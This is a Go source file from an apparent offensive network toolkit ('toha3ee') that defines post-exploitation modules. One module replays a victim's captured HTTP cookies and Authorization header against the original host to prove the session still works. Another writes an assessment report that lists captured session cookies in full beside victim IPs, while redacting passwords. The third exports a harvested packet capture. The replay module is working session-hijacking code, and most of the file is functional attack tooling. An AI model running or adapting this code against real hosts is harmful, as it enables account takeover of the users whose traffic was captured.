// Package post contains the post-exploitation modules: Markdown report
// generation, HTTP session replay against a captured host, and pcap export of
// harvested capture files. These run after the recon/harvest stages to turn
// captured data into deliverables.
package post

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"sort"
	"strings"
	"time"

	"github.com/QYVORA/qyvora-toha3ee/internal/attacks"
	"github.com/QYVORA/qyvora-toha3ee/internal/store"
)

func init() {
	attacks.Register(&ReportGenerate{})
	attacks.Register(&SessionReplay{})
	attacks.Register(&PcapExport{})
}

// ReportGenerate produces a Markdown assessment report from the store's host
// inventory, captured credentials, sessions and event log.
type ReportGenerate struct{}

// Meta implements attacks.Module.
func (*ReportGenerate) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "report.generate",
		Category:    "post",
		Risk:        attacks.RiskInfo,
		Targets:     []string{"subnet"},
		Passive:     true,
		Description: "generate a Markdown assessment report from the store (hosts, credentials, sessions, event log)",
		Limitations: "only reflects data already captured in this session",
	}
}

// Preflight checks the output path is writable.
func (*ReportGenerate) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	path := ctx.Conf.GetDefault("report.generate", "out", "toha3ee-report.md")
	if dir := filepath.Dir(path); dir != "." {
		if st, err := os.Stat(dir); err != nil || !st.IsDir() {
			rep.AddBlocked("out", fmt.Sprintf("output directory %q does not exist", dir))
			return rep, nil
		}
	}
	rep.AddOK("out", path)
	rep.AddOK("data", fmt.Sprintf("%d host(s), %d credential(s), %d session(s) in store",
		len(ctx.Store.Hosts()), len(ctx.Store.Creds()), len(ctx.Store.Sessions())))
	return rep, nil
}

// Run renders the report and writes it to the configured path.
func (*ReportGenerate) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	path := ctx.Conf.GetDefault("report.generate", "out", "toha3ee-report.md")
	md := renderReport(ctx.Store, ctx.Iface.String(), time.Now())
	if err := os.WriteFile(path, []byte(md), 0o644); err != nil {
		return fmt.Errorf("report.generate: %w", err)
	}
	ctx.SetState("report.generate", path)
	ctx.Printf("[*] report.generate wrote %s (%d bytes)\n", path, len(md))
	return nil
}

// Verify reports the report path and size.
func (*ReportGenerate) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("report.generate")
	if !ok {
		return nil, fmt.Errorf("report.generate has not run")
	}
	path := v.(string)
	st, err := os.Stat(path)
	if err != nil {
		return nil, err
	}
	imp := &attacks.Impact{Summary: fmt.Sprintf("report written to %s (%d bytes)", path, st.Size())}
	imp.Add("path", path)
	imp.Add("bytes", fmt.Sprintf("%d", st.Size()))
	imp.Add("hosts", fmt.Sprintf("%d", len(ctx.Store.Hosts())))
	imp.Add("creds", fmt.Sprintf("%d", len(ctx.Store.Creds())))
	return imp, nil
}

// Cleanup is a no-op: the report file is left on disk on purpose.
func (*ReportGenerate) Cleanup(ctx *attacks.AttackCtx) error { return nil }

// renderReport builds the Markdown document from store state.
func renderReport(st *store.Store, iface string, at time.Time) string {
	var b strings.Builder
	b.WriteString("# toha3ee assessment report\n\n")
	fmt.Fprintf(&b, "- Generated: %s\n- Interface: %s\n\n", at.Format(time.RFC3339), iface)

	hosts := st.Hosts()
	sort.Slice(hosts, func(i, j int) bool { return hosts[i].IP.String() < hosts[j].IP.String() })
	b.WriteString("## Hosts\n\n")
	if len(hosts) == 0 {
		b.WriteString("_none observed_\n\n")
	}
	for _, h := range hosts {
		fmt.Fprintf(&b, "- **%s**", h.IP)
		if h.MAC != nil {
			fmt.Fprintf(&b, " `%s`", h.MAC)
			if h.Vendor != "" {
				fmt.Fprintf(&b, " (%s)", h.Vendor)
			}
		}
		if h.Name != "" {
			fmt.Fprintf(&b, " name=%q", h.Name)
		}
		if h.OSGuess != "" {
			fmt.Fprintf(&b, " os=%q", h.OSGuess)
		}
		if ports := h.OpenPorts(); len(ports) > 0 {
			ps := make([]string, 0, len(ports))
			for _, p := range ports {
				ps = append(ps, fmt.Sprintf("%d", p))
			}
			fmt.Fprintf(&b, " ports=[%s]", strings.Join(ps, ","))
		}
		b.WriteString("\n")
	}

	b.WriteString("\n## Credentials\n\n")
	creds := st.Creds()
	if len(creds) == 0 {
		b.WriteString("_none captured_\n\n")
	}
	for _, c := range creds {
		fmt.Fprintf(&b, "- [%s] `%s`:`<redacted>` host=%s victim=%s source=%s at %s\n",
			c.Service, c.Username, c.Host, c.VictimIP, c.Source, c.Time.Format(time.RFC3339))
		if c.Extra != "" {
			fmt.Fprintf(&b, "  - extra: `<redacted>`\n")
		}
	}

	b.WriteString("\n## Sessions\n\n")
	sess := st.Sessions()
	if len(sess) == 0 {
		b.WriteString("_none captured_\n\n")
	}
	for _, s := range sess {
		cookies := make([]string, 0, len(s.Cookies))
		for k, v := range s.Cookies {
			cookies = append(cookies, k+"="+v)
		}
		fmt.Fprintf(&b, "- host=%s victim=%s cookies=`%s` at %s\n",
			s.Host, s.VictimIP, strings.Join(cookies, "; "), s.Captured.Format(time.RFC3339))
	}

	b.WriteString("\n## Event log\n\n")
	events := st.Events()
	if len(events) == 0 {
		b.WriteString("_empty_\n\n")
	}
	for _, e := range events {
		fmt.Fprintf(&b, "- `%s` [%s] %s\n", e.Time.Format(time.RFC3339), e.Topic, e.Msg)
	}
	b.WriteString("\n---\n_generated by toha3ee_\n")
	return b.String()
}

// SessionReplay replays a captured HTTP session (cookies/auth headers) against
// the original host to validate the session is still alive, proving
// post-exploitation access.
type SessionReplay struct{}

// Meta implements attacks.Module.
func (*SessionReplay) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "session.replay",
		Category:    "post",
		Risk:        attacks.RiskMedium,
		Targets:     []string{"host"},
		Description: "replay a captured HTTP session against its host to prove the session is still valid",
		Limitations: "only works while the session cookie is unexpired and the host is reachable; some sites rotate sessions on login",
	}
}

type replayState struct {
	session store.Session
	status  int
	alive   bool
}

// Preflight checks a session exists and a host can be derived.
func (*SessionReplay) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	if len(ctx.Store.Sessions()) == 0 {
		rep.AddBlocked("sessions", "no captured sessions in the store (run http.harvest/https.proxy first)")
		return rep, nil
	}
	rep.AddOK("sessions", fmt.Sprintf("%d captured session(s) available", len(ctx.Store.Sessions())))
	return rep, nil
}

// Run replays the newest captured session and reports the response status.
func (*SessionReplay) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	attacks.RunOpts(opts, "session_id")
	sessions := ctx.Store.Sessions()
	if len(sessions) == 0 {
		return fmt.Errorf("session.replay: no captured sessions to replay")
	}
	sess := sessions[len(sessions)-1]

	u := &url.URL{Scheme: "http", Host: sess.Host}
	if sess.AuthHeader != "" {
		u.Scheme = "https"
	}
	req, err := http.NewRequest(http.MethodGet, u.String(), nil)
	if err != nil {
		return fmt.Errorf("session.replay: %w", err)
	}
	req.Header.Set("User-Agent", "toha3ee/"+sess.VictimIP)
	for k, v := range sess.Cookies {
		req.AddCookie(&http.Cookie{Name: k, Value: v})
	}
	if sess.AuthHeader != "" {
		req.Header.Set("Authorization", sess.AuthHeader)
	}

	client := &http.Client{Timeout: 10 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		return fmt.Errorf("session.replay: host %s unreachable: %w", sess.Host, err)
	}
	defer func() { _ = resp.Body.Close() }()
	_, _ = io.Copy(io.Discard, io.LimitReader(resp.Body, 4096))

	st := &replayState{session: sess, status: resp.StatusCode, alive: resp.StatusCode < 400}
	ctx.SetState("session.replay", st)
	ctx.Printf("[*] session.replay: %s returned %s (%v)\n", sess.Host, resp.Status, st.alive)
	return nil
}

// Verify reports replay outcome.
func (*SessionReplay) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("session.replay")
	if !ok {
		return nil, fmt.Errorf("session.replay has not run")
	}
	st := v.(*replayState)
	imp := &attacks.Impact{Summary: fmt.Sprintf("session against %s returned HTTP %d (alive=%v)", st.session.Host, st.status, st.alive)}
	imp.Add("host", st.session.Host)
	imp.Add("status", fmt.Sprintf("%d", st.status))
	imp.Add("alive", fmt.Sprintf("%v", st.alive))
	imp.Add("victim", st.session.VictimIP)
	return imp, nil
}

// Cleanup is a no-op.
func (*SessionReplay) Cleanup(ctx *attacks.AttackCtx) error { return nil }

// PcapExport copies the harvest pcap (from http.harvest) to an export path so
// the capture survives session shutdown.
type PcapExport struct{}

// Meta implements attacks.Module.
func (*PcapExport) Meta() attacks.ModuleMeta {
	return attacks.ModuleMeta{
		ID:          "pcap.export",
		Category:    "post",
		Risk:        attacks.RiskInfo,
		Targets:     []string{"subnet"},
		Passive:     true,
		Description: "export the packet capture written by http.harvest to a stable path",
		Limitations: "requires a capture file (configure http.harvest.pcap and run http.harvest first)",
	}
}

// Preflight checks the source capture exists.
func (*PcapExport) Preflight(ctx *attacks.AttackCtx) (*attacks.PreflightReport, error) {
	rep := &attacks.PreflightReport{}
	src := ctx.Conf.GetDefault("http.harvest", "pcap", "toha3ee.pcap")
	if st, err := os.Stat(src); err != nil || st.IsDir() {
		rep.AddBlocked("src", fmt.Sprintf("capture file %q not found (run http.harvest first)", src))
		return rep, nil
	}
	rep.AddOK("src", src)
	return rep, nil
}

// Run copies the capture to the export path.
func (*PcapExport) Run(ctx *attacks.AttackCtx, opts map[string]string) error {
	src := ctx.Conf.GetDefault("http.harvest", "pcap", "toha3ee.pcap")
	dst := ctx.Conf.GetDefault("pcap.export", "out", "toha3ee-export.pcap")
	in, err := os.Open(src)
	if err != nil {
		return fmt.Errorf("pcap.export: %w", err)
	}
	defer func() { _ = in.Close() }()
	out, err := os.Create(dst)
	if err != nil {
		return fmt.Errorf("pcap.export: %w", err)
	}
	defer func() { _ = out.Close() }()
	n, err := io.Copy(out, in)
	if err != nil {
		return fmt.Errorf("pcap.export: %w", err)
	}
	ctx.SetState("pcap.export", dst)
	ctx.Printf("[*] pcap.export copied %s -> %s (%d bytes)\n", src, dst, n)
	return nil
}

// Verify reports the export path and size.
func (*PcapExport) Verify(ctx *attacks.AttackCtx) (*attacks.Impact, error) {
	v, ok := ctx.GetState("pcap.export")
	if !ok {
		return nil, fmt.Errorf("pcap.export has not run")
	}
	dst := v.(string)
	st, err := os.Stat(dst)
	if err != nil {
		return nil, err
	}
	imp := &attacks.Impact{Summary: fmt.Sprintf("capture exported to %s (%d bytes)", dst, st.Size())}
	imp.Add("path", dst)
	imp.Add("bytes", fmt.Sprintf("%d", st.Size()))
	return imp, nil
}

// Cleanup is a no-op: the exported pcap stays on disk.
func (*PcapExport) Cleanup(ctx *attacks.AttackCtx) error { return nil }
